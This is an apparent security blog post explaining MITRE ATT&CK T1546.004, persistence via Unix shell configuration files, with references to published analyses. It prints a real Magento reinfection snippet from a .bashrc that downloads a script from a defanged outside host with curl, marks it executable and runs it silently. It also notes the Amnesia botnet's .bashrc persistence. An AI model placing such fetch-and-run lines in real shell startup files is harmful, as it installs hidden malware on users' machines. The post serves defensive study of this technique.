<!DOCTYPE html>
<html lang="en">
  <head>
    
      <title>
        Event Triggered Execution: Unix Shell Configuration Modification (T1546.004) ::
        Axelarator Blog — A simple theme for Hugo
      </title>
    
    <meta http-equiv="content-type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0" />
<meta
  name="description"
  content="Event Triggered Execution: Unix Shell Configuration Modification # T1546.004
Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment."
/>
<meta
  name="keywords"
  content=""
/>
<meta name="robots" content="noodp" />
<link rel="canonical" href="https://axelarator.github.io/posts/modification/" />





<link rel="stylesheet" href="https://axelarator.github.io/assets/style.css" />

<link rel="stylesheet" href="https://axelarator.github.io/style.css" />


<link
  rel="apple-touch-icon-precomposed"
  sizes="144x144"
  href="https://axelarator.github.io/img/apple-touch-icon-144-precomposed.png"
/>
<link rel="shortcut icon" href="https://axelarator.github.io/img/favicon.png" />


<link href="https://axelarator.github.io/assets/fonts/Inter-Italic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://axelarator.github.io/assets/fonts/Inter-Regular.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://axelarator.github.io/assets/fonts/Inter-Medium.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://axelarator.github.io/assets/fonts/Inter-MediumItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://axelarator.github.io/assets/fonts/Inter-Bold.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">
<link href="https://axelarator.github.io/assets/fonts/Inter-BoldItalic.woff2" rel="preload" type="font/woff2" as="font" crossorigin="">


<meta name="twitter:card" content="summary"/><meta name="twitter:title" content="Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)"/>
<meta name="twitter:description" content="Event Triggered Execution: Unix Shell Configuration Modification # T1546.004
Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment."/>



<meta property="og:title" content="Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)" />
<meta property="og:description" content="Event Triggered Execution: Unix Shell Configuration Modification # T1546.004
Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User Unix Shells execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (/etc) and the user’s home directory (~/) to configure the environment." />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://axelarator.github.io/posts/modification/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-06-23T20:27:39-04:00" />
<meta property="article:modified_time" content="2022-06-23T20:27:39-04:00" /><meta property="og:site_name" content="Axelarator Blog" />






  </head>
  <body class="dark-theme">
    <div class="container">
      <header class="header">
  <span class="header__inner">
    <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Axelarator</span
    >
    <span class="logo__cursor"></span>
  
</a>

    <span class="header__right">
      
        <nav class="menu">
  <ul class="menu__inner menu__inner--desktop">
    
      
        
          <li><a href="/about">About</a></li>
        
      
        
          <li><a href="/projects">Projects</a></li>
        
      
      
      
  </ul>

  <ul class="menu__inner menu__inner--mobile">
    
      
        <li><a href="/about">About</a></li>
      
    
      
        <li><a href="/projects">Projects</a></li>
      
    
  </ul>
</nav>

        <span class="menu-trigger">
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
            <path d="M0 0h24v24H0z" fill="none" />
            <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z" />
          </svg>
        </span>
      
      <span class="theme-toggle">
        <svg
  class="theme-toggler"
  width="24"
  height="24"
  viewBox="0 0 48 48"
  fill="none"
  xmlns="http://www.w3.org/2000/svg"
>
  <path
    d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
  3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
  13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"
  />
</svg>

      </span>
    </span>
  </span>
</header>


      <div class="content">
        
  
  

  <div class="post">
    <h1 class="post-title">Event Triggered Execution: Unix Shell Configuration Modification (T1546.004)</h1>
    <div class="post-meta">
      
        <span class="post-date">
          2022-06-23
        </span>

        
          
        
      

      


      
    </div>

    

    

    <div class="post-content">
      
      <h1 id="event-triggered-execution-unix-shell-configuration-modification">
  Event Triggered Execution: Unix Shell Configuration Modification
  <a href="#event-triggered-execution-unix-shell-configuration-modification" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p><a href="https://attack.mitre.org/techniques/T1546/004/">T1546.004</a></p>
<p><em>Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User <a href="https://attack.mitre.org/techniques/T1059/004">Unix Shell</a>s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system (<code>/etc</code>) and the user’s home directory (<code>~/</code>) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.</em></p>
<p><em>Adversaries may attempt to establish persistence by inserting commands
into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the <code>/etc/profile</code> and <code>/etc/profile.d</code> files. These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into <code>~/.bash_profile</code>, <code>~/.bash_login</code>, or <code>~/.profile</code> which are sourced when a user opens a command-line interface or connects remotely.</em></p>
<h1 id="attack-vectors">
  Attack Vectors
  <a href="#attack-vectors" class="h-anchor" aria-hidden="true">#</a>
</h1>
<h3 id="magento">
  Magento
  <a href="#magento" class="h-anchor" aria-hidden="true">#</a>
</h3>
<p>Malicious code was inserted within a site owner’s <code>.bashrc</code> file that downloads a JavaScript file from a remote location. This file loads whenever a user logs into a Unix account locally or through SSH.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>checks<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>ps aux | grep php-fpm | grep -v grep | grep tmp<span style="color:#66d9ef">)</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[</span> <span style="color:#e6db74">&#34;</span>$checks<span style="color:#e6db74">&#34;</span> <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;&#34;</span> <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   rm -rf /tmp/.a /tmp/start_6457387765553057055;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">if</span> ! <span style="color:#f92672">[</span> -f /tmp/php-fpm <span style="color:#f92672">]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      curl -qs javascloud<span style="color:#f92672">[</span>.<span style="color:#f92672">]</span>com/victim_install.js &gt; /tmp/php-fpm;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>      chmod +x /tmp/php-fpm;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>   /bin/sh /tmp/php-fpm &gt; /dev/null 2&gt;&amp;<span style="color:#ae81ff">1</span> &amp;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Fi
</span></span></code></pre></div><p><strong>Amnesia - IoT/Linux Botnet</strong></p>
<p>Amnesia creates persistence files in <code>~/.bashrc</code> and <code>~/.bash_history</code>.</p>
<h1 id="references">
  References
  <a href="#references" class="h-anchor" aria-hidden="true">#</a>
</h1>
<p><a href="https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html">https://blog.sucuri.net/2018/05/shell-logins-as-a-magento-reinfection-vector.html</a></p>
<p><a href="https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/">https://scriptingosx.com/2019/06/moving-to-zsh-part-2-configuration-files/</a></p>
<p><a href="https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/">https://unit42.paloaltonetworks.com/unit42-new-iotlinux-malware-targets-dvrs-forms-botnet/</a></p>

    </div>
    
      
        <div class="pagination">
          <div class="pagination__title">
            <span class="pagination__title-h"
              >Read other posts</span
            >
            <hr />
          </div>
          <div class="pagination__buttons">
            
              <span class="button previous">
                <a href="https://axelarator.github.io/posts/malwarelab/">
                  <span class="button__icon">←</span>
                  <span class="button__text">Malware Analysis Homelab</span>
                </a>
              </span>
            
            
              <span class="button next">
                <a href="https://axelarator.github.io/posts/unixshell/">
                  <span class="button__text">Command and Scripting Interpreter: Unix Shell (T1059.004)</span>
                  <span class="button__icon">→</span>
                </a>
              </span>
            
          </div>
        </div>
      
    

    
      
        

      
    
  </div>

      </div>

      
        <footer class="footer">
  <div class="footer__inner">
    
      <a
  href="/"
  class="logo"
  style="text-decoration: none;"
>
  
    <span class="logo__mark"><svg xmlns="http://www.w3.org/2000/svg" class="greater-icon" viewBox="0 0 44 44">
  <path fill="none" d="M15 8l14.729 14.382L15 35.367" />
</svg>
</span>
    <span class="logo__text"
      >Axelarator</span
    >
    <span class="logo__cursor"></span>
  
</a>

      <div class="copyright">
        <span
          >© 2024 Powered by
          <a href="https://gohugo.io" target="_blank" rel="noopener">Hugo</a></span
        >
        <span
          >Theme created by
          <a href="https://twitter.com/panr" target="_blank" rel="noopener">panr</a></span
        >
      </div>
    
  </div>
</footer>

<script src="https://axelarator.github.io/assets/main.js"></script>
<script src="https://axelarator.github.io/assets/prism.js"></script>


      
    </div>

    
  </body>
</html>
